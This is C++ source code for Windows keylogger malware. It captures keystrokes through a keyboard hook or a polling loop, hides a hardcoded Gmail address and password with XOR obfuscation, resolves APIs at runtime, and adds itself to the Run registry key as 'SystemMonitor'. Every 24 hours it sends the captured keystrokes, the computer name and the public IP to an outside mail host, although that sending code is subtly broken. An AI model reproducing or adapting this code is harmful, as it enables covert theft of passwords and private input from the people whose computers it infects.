#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <string>
#include <ctime>
#include <vector>
#include <random>
#include <sstream>
#include <algorithm>
#include <Wincrypt.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// ====================== OBFUSCATION ======================
#define HIDE_STR(str) []() -> std::string { \
    constexpr char key = 0x55; \
    std::string s = str; \
    for (char& c : s) c ^= key; \
    return s; \
}()

// API resolution structure
struct APIResolver {
    template <typename T>
    static T Get(const std::string& lib, const std::string& func) {
        HMODULE hMod = LoadLibraryA(lib.c_str());
        if (!hMod) return nullptr;
        return reinterpret_cast<T>(GetProcAddress(hMod, func.c_str()));
    }
};

// ====================== CONFIGURATION ======================
const std::string EMAIL_USER = HIDE_STR("loirverse@gmail.com");
const std::string EMAIL_PASS = HIDE_STR("kfjnnlovftazuxkk");
const std::string SMTP_SERVER = HIDE_STR("smtp.gmail.com");
const int SMTP_PORT = 587;

std::string userPath;
std::string computerName;
HANDLE hLogMutex;
std::string keystrokeBuffer;

// ====================== UTILITIES ======================
std::string GetTimestamp() {
    SYSTEMTIME st;
    auto pGetLocalTime = APIResolver::Get<decltype(&GetLocalTime)>("kernel32.dll", "GetLocalTime");
    pGetLocalTime(&st);
    
    char buffer[128];
    auto pwsprintf = APIResolver::Get<decltype(&wsprintfA)>("user32.dll", "wsprintfA");
    pwsprintf(buffer, "[%04d-%02d-%02d %02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
    return buffer;
}

void WriteToLog(const std::string& content) {
    auto pWaitForSingleObject = APIResolver::Get<decltype(&WaitForSingleObject)>("kernel32.dll", "WaitForSingleObject");
    auto pReleaseMutex = APIResolver::Get<decltype(&ReleaseMutex)>("kernel32.dll", "ReleaseMutex");
    
    pWaitForSingleObject(hLogMutex, INFINITE);
    keystrokeBuffer += content;
    pReleaseMutex(hLogMutex);
}

std::string GetPublicIP() {
    auto pInternetOpen = APIResolver::Get<decltype(&InternetOpenA)>("wininet.dll", "InternetOpenA");
    auto pInternetOpenUrl = APIResolver::Get<decltype(&InternetOpenUrlA)>("wininet.dll", "InternetOpenUrlA");
    auto pInternetReadFile = APIResolver::Get<decltype(&InternetReadFile)>("wininet.dll", "InternetReadFile");
    auto pInternetCloseHandle = APIResolver::Get<decltype(&InternetCloseHandle)>("wininet.dll", "InternetCloseHandle");
    
    HINTERNET hInternet = pInternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "unknown";
    
    HINTERNET hUrl = pInternetOpenUrl(hInternet, "http://api.ipify.org", NULL, 0, 
                                     INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        pInternetCloseHandle(hInternet);
        return "unknown";
    }
    
    char buffer[128] = {0};
    DWORD bytesRead;
    std::string ip;
    while (pInternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
        if (bytesRead == 0) break;
        ip.append(buffer, bytesRead);
    }
    
    pInternetCloseHandle(hUrl);
    pInternetCloseHandle(hInternet);
    
    return ip.empty() ? "unknown" : ip;
}

// ====================== KEYLOGGER ======================
class IKeylogger {
public:
    virtual void Start() = 0;
    virtual ~IKeylogger() = default;
};

class HookKeylogger : public IKeylogger {
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            
            if (wParam == WM_KEYDOWN) {
                std::string logEntry;
                
                // Special keys handling
                switch (kb->vkCode) {
                    case VK_SPACE: logEntry = "[Space]"; break;
                    case VK_RETURN: logEntry = "[Enter]\n"; break;
                    case VK_BACK: logEntry = "[Backspace]"; break;
                    case VK_TAB: logEntry = "[Tab]"; break;
                    case VK_ESCAPE: logEntry = "[Esc]"; break;
                    case VK_CAPITAL: logEntry = "[CapsLock]"; break;
                    case VK_SHIFT: logEntry = "[Shift]"; break;
                    case VK_CONTROL: logEntry = "[Ctrl]"; break;
                    case VK_MENU: logEntry = "[Alt]"; break;
                    case VK_LWIN: case VK_RWIN: logEntry = "[Win]"; break;
                    default:
                        // Alphanumeric handling
                        if ((kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)) {
                            char c = static_cast<char>(kb->vkCode);
                            bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
                            
                            // Handle letters
                            if (kb->vkCode >= 0x41 && kb->vkCode <= 0x5A) {
                                c = isShift ? c : c + 32;
                            }
                            // Handle numbers/symbols
                            else if (isShift) {
                                const char shiftMap[] = ")!@#$%^&*(";
                                c = shiftMap[kb->vkCode - 0x30];
                            }
                            
                            logEntry = std::string(1, c);
                        }
                }
                
                if (!logEntry.empty()) {
                    WriteToLog(logEntry);
                }
            }
        }
        
        auto pCallNextHook = APIResolver::Get<decltype(&CallNextHookEx)>("user32.dll", "CallNextHookEx");
        return pCallNextHook(nullptr, nCode, wParam, lParam);
    }

public:
    void Start() override {
        auto pSetHook = APIResolver::Get<decltype(&SetWindowsHookExA)>("user32.dll", "SetWindowsHookExA");
        HHOOK hook = pSetHook(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
        
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        auto pUnhook = APIResolver::Get<decltype(&UnhookWindowsHookEx)>("user32.dll", "UnhookWindowsHookEx");
        pUnhook(hook);
    }
};

class PollKeylogger : public IKeylogger {
public:
    void Start() override {
        BYTE keyState[256] = {0};
        
        while (true) {
            for (int i = 8; i < 256; i++) {
                auto pGetAsyncKeyState = APIResolver::Get<decltype(&GetAsyncKeyState)>("user32.dll", "GetAsyncKeyState");
                SHORT state = pGetAsyncKeyState(i);
                
                if (state & 0x8000 && !keyState[i]) {
                    // Key pressed
                    keyState[i] = 1;
                    
                    // Handle special keys
                    std::string key;
                    switch (i) {
                        case VK_SPACE: key = "[Space]"; break;
                        case VK_RETURN: key = "[Enter]\n"; break;
                        case VK_BACK: key = "[Backspace]"; break;
                        case VK_TAB: key = "[Tab]"; break;
                        case VK_ESCAPE: key = "[Esc]"; break;
                        case VK_CAPITAL: key = "[CapsLock]"; break;
                        case VK_SHIFT: key = "[Shift]"; break;
                        case VK_CONTROL: key = "[Ctrl]"; break;
                        case VK_MENU: key = "[Alt]"; break;
                        case VK_LWIN: case VK_RWIN: key = "[Win]"; break;
                        default:
                            // Alphanumeric keys
                            char c = static_cast<char>(i);
                            if (i >= 'A' && i <= 'Z') {
                                bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
                                key = std::string(1, isShift ? c : c + 32);
                            }
                            else if ((i >= 0x30 && i <= 0x39) || 
                                     (i >= 0xBA && i <= 0xC0)) {
                                key = std::string(1, c);
                            }
                    }
                    
                    if (!key.empty()) {
                        WriteToLog(key);
                    }
                } 
                else if (!(state & 0x8000) && keyState[i]) {
                    keyState[i] = 0;
                }
            }
            
            Sleep(10);
        }
    }
};

IKeylogger* CreateKeylogger() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 1);
    return (dis(gen) == 0) 
        ? static_cast<IKeylogger*>(new HookKeylogger()) 
        : static_cast<IKeylogger*>(new PollKeylogger());
};


// ====================== EMAIL EXFILTRATION ======================
void SendEmail(const std::string& subject, const std::string& body) {
    auto pInternetOpen = APIResolver::Get<decltype(&InternetOpenA)>("wininet.dll", "InternetOpenA");
    auto pInternetConnect = APIResolver::Get<decltype(&InternetConnectA)>("wininet.dll", "InternetConnectA");
    auto pHttpOpenRequest = APIResolver::Get<decltype(&HttpOpenRequestA)>("wininet.dll", "HttpOpenRequestA");
    auto pHttpSendRequest = APIResolver::Get<decltype(&HttpSendRequestA)>("wininet.dll", "HttpSendRequestA");
    auto pInternetCloseHandle = APIResolver::Get<decltype(&InternetCloseHandle)>("wininet.dll", "InternetCloseHandle");
    
    HINTERNET hInternet = pInternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = pInternetConnect(hInternet, SMTP_SERVER.c_str(), 
                                         SMTP_PORT, EMAIL_USER.c_str(), 
                                         EMAIL_PASS.c_str(), 
                                         INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        pInternetCloseHandle(hInternet);
        return;
    }

    const char* acceptTypes[] = {"*/*", NULL};
    HINTERNET hRequest = pHttpOpenRequest(hConnect, "POST", "", NULL, NULL, 
                                        acceptTypes, 
                                        INTERNET_FLAG_SECURE | 
                                        INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hRequest) {
        pInternetCloseHandle(hConnect);
        pInternetCloseHandle(hInternet);
        return;
    }

    std::string requestBody = 
        "From: " + EMAIL_USER + "\r\n"
        "To: " + EMAIL_USER + "\r\n"  // Send to self
        "Subject: " + subject + "\r\n"
        "Content-Type: text/plain; charset=\"UTF-8\"\r\n\r\n" +
        body;

    std::string headers = 
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: " + std::to_string(requestBody.size());

    pHttpSendRequest(hRequest, headers.c_str(), headers.size(), 
                    (LPVOID)requestBody.c_str(), requestBody.size());
    
    pInternetCloseHandle(hRequest);
    pInternetCloseHandle(hConnect);
    pInternetCloseHandle(hInternet);
}

DWORD WINAPI EmailThread(LPVOID) {
    auto pSleep = APIResolver::Get<decltype(&Sleep)>("kernel32.dll", "Sleep");
    auto pWaitForSingleObject = APIResolver::Get<decltype(&WaitForSingleObject)>("kernel32.dll", "WaitForSingleObject");
    auto pReleaseMutex = APIResolver::Get<decltype(&ReleaseMutex)>("kernel32.dll", "ReleaseMutex");
    
    while (true) {
        pSleep(86400000); // 24 hours
        
        pWaitForSingleObject(hLogMutex, INFINITE);
        
        if (!keystrokeBuffer.empty()) {
            // Create log file with computer name
            std::string logPath = userPath + computerName + "_system_log.txt";
            std::ofstream logFile(logPath);
            logFile << keystrokeBuffer;
            logFile.close();
            
            // Get public IP
            std::string publicIP = GetPublicIP();
            
            // Build email body with IP and computer name
            std::string fullBody = "Computer Name: " + computerName + "\n";
            fullBody += "Public IP: " + publicIP + "\n\n";
            fullBody += keystrokeBuffer;
            
            // Send email with log contents
            std::string subject = "System Report - " + computerName + " - " + GetTimestamp();
            SendEmail(subject, fullBody);
            
            // Clear buffer
            keystrokeBuffer.clear();
        }
        
        pReleaseMutex(hLogMutex);
    }
    return 0;
}

// ====================== PERSISTENCE ======================
void InstallPersistence() {
    auto pGetModuleFileName = APIResolver::Get<decltype(&GetModuleFileNameA)>("kernel32.dll", "GetModuleFileNameA");
    auto pCopyFile = APIResolver::Get<decltype(&CopyFileA)>("kernel32.dll", "CopyFileA");
    auto pRegOpenKey = APIResolver::Get<decltype(&RegOpenKeyExA)>("advapi32.dll", "RegOpenKeyExA");
    auto pRegSetValue = APIResolver::Get<decltype(&RegSetValueExA)>("advapi32.dll", "RegSetValueExA");
    
    char exePath[MAX_PATH];
    pGetModuleFileName(nullptr, exePath, MAX_PATH);
    
    std::string targetPath = userPath + "SystemMonitor.exe";
    pCopyFile(exePath, targetPath.c_str(), FALSE);

    HKEY hKey;
    pRegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
               0, KEY_WRITE, &hKey);
    pRegSetValue(hKey, "SystemMonitor", 0, REG_SZ, 
                reinterpret_cast<const BYTE*>(targetPath.c_str()), targetPath.size());
    RegCloseKey(hKey);
}

// ====================== MAIN ======================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Initialize paths
    auto pGetEnvironmentVariable = APIResolver::Get<decltype(&GetEnvironmentVariableA)>("kernel32.dll", "GetEnvironmentVariableA");
    auto pCreateDirectory = APIResolver::Get<decltype(&CreateDirectoryA)>("kernel32.dll", "CreateDirectoryA");
    auto pCreateMutex = APIResolver::Get<decltype(&CreateMutexA)>("kernel32.dll", "CreateMutexA");
    auto pCreateThread = APIResolver::Get<decltype(&CreateThread)>("kernel32.dll", "CreateThread");
    auto pCloseHandle = APIResolver::Get<decltype(&CloseHandle)>("kernel32.dll", "CloseHandle");
    auto pGetComputerName = APIResolver::Get<decltype(&GetComputerNameA)>("kernel32.dll", "GetComputerNameA");
    
    // Get computer name
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(compName);
    if (pGetComputerName(compName, &size)) {
        computerName = compName;
    } else {
        computerName = "unknown";
    }
    
    // Get AppData path
    char appData[MAX_PATH];
    pGetEnvironmentVariable("APPDATA", appData, MAX_PATH);
    userPath = std::string(appData) + "\\SystemCache\\";
    pCreateDirectory(userPath.c_str(), NULL);
    
    // Create mutex for thread-safe logging
    hLogMutex = pCreateMutex(NULL, FALSE, NULL);
    
    // Install persistence
    InstallPersistence();
    
    // Start email thread
    HANDLE hEmailThread = pCreateThread(NULL, 0, EmailThread, NULL, 0, NULL);
    
    // Start polymorphic keylogger
    std::unique_ptr<IKeylogger> keylogger(CreateKeylogger());
    keylogger->Start();
    
    // Cleanup (should never reach here)
    pCloseHandle(hEmailThread);
    pCloseHandle(hLogMutex);
    return 0;
}